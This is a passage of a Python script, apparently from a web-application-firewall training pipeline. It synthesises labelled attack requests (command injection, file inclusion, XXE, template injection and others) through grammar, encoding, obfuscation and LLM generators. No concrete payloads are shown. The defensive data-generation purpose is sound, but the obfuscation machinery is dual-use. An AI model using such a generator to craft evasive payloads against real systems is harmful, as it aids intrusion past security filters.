    "cmdi":            dict(method="POST", param="host",      endpoint="/api/v1/ping"),
    "lfi":             dict(method="GET",  param="path",      endpoint="/api/v1/file"),
    "path_traversal":  dict(method="GET",  param="file",      endpoint="/download"),
    "header_injection":dict(method="GET",  param="redirect",  endpoint="/api/v1/redirect"),
    "xxe":             dict(method="POST", param="",          endpoint="/api/v1/xml", raw_body=True),
    "ssti":            dict(method="GET",  param="template",  endpoint="/api/v1/render"),
}


def _payload_to_record(
    payload:      str,
    attack_class: str,
    source:       str,
) -> HttpRecord | None:
    """
    Wrap a raw payload in a minimal but schema-valid HTTP envelope.

    Method, param, and endpoint are class-correct; all other metadata is a
    stub placeholder replaced by 02_request_framing.py.
    Returns None if schema validation fails.
    """
    meta     = _CLASS_META.get(attack_class, dict(method="GET", param="input", endpoint="/api/data"))
    method   = meta["method"]
    param    = meta.get("param", "input")
    endpoint = meta["endpoint"]
    raw_body = meta.get("raw_body", False)

    if raw_body:
        qs, body = "", payload
    elif method == "GET":
        qs, body = f"{param}={payload}", ""
    else:
        qs, body = "", f"{param}={payload}"

    headers = _STUB_HEADERS

    try:
        record = HttpRecord(
            id=str(uuid.uuid4()),
            method=method,
            path=endpoint,
            query_string=qs,
            headers=headers,
            body=body,
            label=1,
            attack_class=attack_class,
            source=source,
        ).build_raw()
        return record
    except Exception as e:
        log.debug(f"Schema validation failed for payload '{payload[:40]}': {e}")
        return None


# ─────────────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────────────

def _load_seed_payloads(splits_dir: Path) -> list[str]:
    """Extract raw query strings from the existing malicious train split as mutation seeds."""
    train_path = splits_dir / "train.parquet"
    if not train_path.exists():
        return []
    table = pq.read_table(train_path, filters=[("label", "=", 1)])
    rows  = table.to_pylist()
    return [r.get("query_string", "") or r.get("body", "") for r in rows if r.get("query_string") or r.get("body")]


def run(args: argparse.Namespace) -> None:
    configure_root()
    cfg = load_config(args.config)
    seed_everything(cfg.project.seed)

    require_inputs({
        "data/splits/train.parquet": "make baselines",
    })
    if check_output(
        Path(cfg.paths.data_augmented) / "synthesis" / "synthesized_attacks.parquet",
        args.force, "Stage 3.1 attack synthesis"
    ):
        return

    aug_cfg               = cfg.augmentation
    target                = getattr(aug_cfg, "target_per_class", TARGET_SAMPLES_PER_CLASS)
    chain_len             = getattr(aug_cfg, "chain_length", 2)
    double_encode_prob    = getattr(aug_cfg, "double_encode_prob",    0.30)
    double_obfuscate_prob = getattr(aug_cfg, "double_obfuscate_prob", 0.30)
    llm_ratio             = getattr(aug_cfg, "llm_ratio",             0.50)

    splits_dir     = Path(cfg.paths.data_splits)
    inventory_path = report_path("taxonomy_inventory.json", cfg.paths.reports)
    out_dir        = Path(cfg.paths.data_augmented) / "synthesis"
    out_dir.mkdir(parents=True, exist_ok=True)

    # Build generator pool
    seeds         = _load_seed_payloads(splits_dir)
    grammar_path  = getattr(aug_cfg, "pcfg_grammars_path", "config/pcfg_grammars.yaml")
    pcfg_registry = load_pcfg_grammars(grammar_path)
    if pcfg_registry:
        log.info(f"PCFG grammars loaded from {grammar_path}: {sorted(pcfg_registry)}")
    else:
        log.info(f"No PCFG grammars at {grammar_path} — using flat grammar templates only")
    generators: list[BaseGenerator] = [
        PcfgGenerator(pcfg_registry),   # recursive PCFG where available; flat templates as fallback
        EncoderGenerator(seeds, enabled=aug_cfg.rules.encodings if hasattr(aug_cfg, "rules") else None),
        ObfuscatorGenerator(seeds),
    ]

    llm_cfg    = aug_cfg.llm
    model_path = args.model_path or llm_cfg.model_path  # CLI flag overrides config for local
    enabled    = llm_cfg.provider and (
        llm_cfg.provider != "local" or (model_path and Path(model_path).exists())
    )
    if enabled:
        generators.append(LlmGenerator(
            provider        = llm_cfg.provider,
            model           = llm_cfg.model,
            model_path      = model_path,
            ollama_base_url = llm_cfg.ollama_base_url,
            max_tokens      = llm_cfg.max_tokens,
            temperature     = llm_cfg.temperature,
            request_timeout = llm_cfg.request_timeout,
        ))
        log.info(f"LlmGenerator enabled: provider={llm_cfg.provider}")
    else:
        log.info("LlmGenerator skipped (no provider configured or local model path not found)")

    governor = AugmentationGovernor(
        inventory_path=inventory_path,
        target_per_class=target,
        generators=generators,
        chain_len=chain_len,
        double_encode_prob=double_encode_prob,
        double_obfuscate_prob=double_obfuscate_prob,
        rng_seed=cfg.project.seed,
        llm_ratio=llm_ratio,
    )

    timer = StepTimer()

    with timer.step("gap_analysis"):
        gaps = governor.gaps()
    if not gaps:
        log.info("All classes meet the target — no augmentation needed.")
        return

    stats:        dict[str, int] = {}
    all_records:  list[HttpRecord] = []

    def _synthesize_and_wrap(attack_class: str, n_needed: int) -> list[HttpRecord]:
        with timer.step(f"synthesis_{attack_class}"):
            tagged = governor.synthesize_class(attack_class, n_needed)
            records = []
            for payload, gen_name in tagged:
                source = f"aug_synthesis_{gen_name}_{attack_class}"
                r = _payload_to_record(payload, attack_class, source)
                if r:
                    records.append(r)
        log.info(f"  {attack_class:15s}: {len(records):,}/{n_needed:,} valid records generated")
        return records

    # Parallel generation (one thread per attack class)
    max_workers = min(len(gaps), len(GRAMMAR_REGISTRY))
    with timer.step("synthesis_total"):
        with Progress(SpinnerColumn(), "[progress.description]{task.description}",
                      BarColumn(), MofNCompleteColumn(), TimeElapsedColumn()) as prog:
            task = prog.add_task("Synthesizing attack classes", total=len(gaps))
            with ThreadPoolExecutor(max_workers=max_workers) as pool:
                futures = {
                    pool.submit(_synthesize_and_wrap, cls, n): cls
                    for cls, n in gaps.items()
                }
                for future in as_completed(futures):
                    cls     = futures[future]
                    records = future.result()
                    stats[cls]   = len(records)
                    all_records += records
                    prog.advance(task)

    # Write output
    if all_records:
        out_path = out_dir / "synthesized_attacks.parquet"
        with timer.step("parquet_write"):
            pq.write_table(records_to_table(all_records), out_path, compression="snappy")
        log.info(f"Wrote {len(all_records):,} records → {out_path}")

    llm_gen    = next((g for g in generators if g.name == "llm"), None)
    llm_provider = llm_cfg.provider if llm_gen else "none"
    llm_model    = llm_cfg.model    if llm_gen else "none"

    stats_path = report_path("augmentation_synthesis.json", cfg.paths.reports)
    stats_path.parent.mkdir(parents=True, exist_ok=True)
    stats_path.write_text(json.dumps({
        "target_per_class":      target,
        "chain_length":          chain_len,
        "double_encode_prob":    double_encode_prob,
        "double_obfuscate_prob": double_obfuscate_prob,
        "llm_ratio":             llm_ratio,
        "generators_used":       [g.name for g in generators],
        "llm_provider":          llm_provider,
        "llm_model":             llm_model,
        "gaps_filled":           stats,
        "total_generated":       len(all_records),
        "timings_s":             timer.timings,
    }, indent=2))
    log.info(f"Synthesis complete: {len(all_records):,} total records across {len(stats)} classes")

    try:
        import mlflow
        from ai_waf_v2.utils.mlflow_utils import init_experiment, log_metrics_dict
        init_experiment(cfg)
        with mlflow.start_run(run_name="01_attack_synthesis"):
            mlflow.log_params({
                "target_per_class": target,
                "chain_length":     chain_len,
                "generators_used":  [g.name for g in generators],
                "n_classes_filled": len(stats),
                "llm_provider":     llm_provider,
                "llm_model":        llm_model,
            })
            metrics: dict[str, float] = {"total_generated": float(len(all_records))}
            for cls, n in stats.items():
                metrics[f"generated_{cls}"] = float(n)
            log_metrics_dict(metrics)
            timer.log_mlflow()
            mlflow.log_artifact(str(stats_path))
    except Exception as exc:
        log.warning(f"MLflow logging skipped: {exc}", exc_info=True)

    if args.save:
        from ai_waf_v2.utils.hub import push_folder
        push_folder(
            cfg,
            folder=Path(cfg.paths.data_augmented) / "synthesis",
            repo_key="dataset_synthesis",
            repo_type="dataset",
            commit_message=f"Stage 3.1 synthesis: {len(all_records):,} records",
            revision=args.revision,
            dry_run=args.dry_run,
        )


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser()
    p.add_argument("--config",     default="config/pipeline.yaml")
    p.add_argument("--model-path", default=None, help="Path to local GGUF model (optional)")
    p.add_argument("--force",    action="store_true", help="Re-run even if outputs already exist")
    p.add_argument("--save",     action="store_true", help="Push outputs to HuggingFace Hub")
    p.add_argument("--revision", default="main",     help="HuggingFace revision/tag (default: main)")
    p.add_argument("--dry-run",  action="store_true", help="Preview hub push without uploading")
    return p.parse_args()


if __name__ == "__main__":
    run(parse_args())